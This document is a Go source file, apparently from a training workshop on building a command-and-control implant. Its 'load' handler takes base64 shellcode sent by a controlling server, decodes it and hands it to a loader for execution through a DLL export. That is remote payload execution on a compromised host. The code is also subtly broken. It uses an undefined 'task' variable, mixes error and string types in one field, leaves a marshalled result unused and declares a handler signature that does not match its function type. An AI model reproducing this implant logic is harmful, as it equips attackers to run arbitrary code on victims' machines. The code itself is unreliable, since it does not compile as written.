package agent

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"workshop3_dev/internals/models"
	"workshop3_dev/internals/shellcode"
)

type OrchestratorFunc func(agent *Agent, job *models.ServerResponse) models.AgentTaskResult

func registerCommands(agent *Agent) {
	// agent.commandOrchestrators["upload"] = (*Agent).orchestrateLoad
}

func (agent *Agent) ExecuteTask(job *models.ServerResponse) {
	log.Printf("AGENT IS NOW PROCESSING COMMAND %s with ID %s", job.Command, job.JobID)

	var result models.AgentTaskResult

	orchestrator, found := agent.commandOrchestrators[job.Command]

	if found {
		result = orchestrator(agent, job)
	} else {
		log.Printf("|WARN AGENT TASK| Received unknown command: '%s' (ID: %s)", job.Command, job.JobID)
		result = models.AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("command not found"),
		}
	}

	// Now marshall the result before sending it back
	resultBytes, err := json.Marshal(result)
	if err != nil {
		log.Printf("|❗ERR AGENT TASK| Failed to marshal result for Task ID %s: %v", job.JobID, err)
		return // Cannot send result if marshalling fails
	}

}

// orchestrateDownload is the orchestrator for the "download" command.
func (agent *Agent) orchestrateLoad(job *models.ServerResponse) models.AgentTaskResult {

	// Create an instance of the load args struct
	var loadArgs models.LoadArgsAgent

	// ServerResponse.Arguments contains the command-specific args, so now we unmarshall the field into the struct
	if err := json.Unmarshal(job.Arguments, &loadArgs); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal LoadArgs for Task ID %s: %v. ", job.JobID, err)
		log.Printf("|❗ERR LOAD ORCHESTRATOR| %s", errMsg)
		return models.AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("failed to unmarshal LoadArgs"),
		}
	}

	log.Printf("|✅ SHELLCODE ORCHESTRATOR| Task ID: %s. Executing Shellcode, Export Function: %s, ShellcodeLen(b64)=%d\n",
		job.JobID, loadArgs.ExportName, len(loadArgs.ShellcodeBase64))

	// Some basic agent-side validation
	if loadArgs.ShellcodeBase64 == "" {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: ShellcodeBase64 is empty.", job.JobID)
		return models.AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("ShellcodeBase64 cannot be empty"),
		}
	}
	if loadArgs.ExportName == "" {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: ExportName is empty.", job.JobID)
		return models.AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("ExportName must be specified for DLL execution"),
		}
	}

	// Now let's decode our b64
	rawShellcode, err := base64.StdEncoding.DecodeString(loadArgs.ShellcodeBase64)
	if err != nil {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: Failed to decode ShellcodeBase64: %v", job.JobID, err)
		return models.AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("Failed to decode shellcode"),
		}
	}

	// Call the "doer" function
	commandShellcode := shellcode.New()
	shellcodeResult, err := commandShellcode.DoShellcode(rawShellcode, loadArgs.ExportName) // Call the interface method

	finalResult := models.AgentTaskResult{
		JobID: job.JobID,
		// Output will be set below after JSON encoding
	}

	outputJSON, _ := json.Marshal(string(shellcodeResult.Message))

	finalResult.Output = outputJSON

	if err != nil {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Loader execution error for TaskID %s: %v. Loader Message: %s",
			task.TaskID, err, shellcodeResult.Message)
		finalResult.Status = models.StatusFailureLoaderError
		finalResult.Error = err.Error()

	} else {
		log.Printf("|👊 SHELLCODE SUCCESS| Shellcode execution initiated successfully for TaskID %s. Loader Message: %s",
			task.TaskID, shellcodeResult.Message)
		finalResult.Status = models.StatusSuccessLaunched
	}

	return finalResult
}
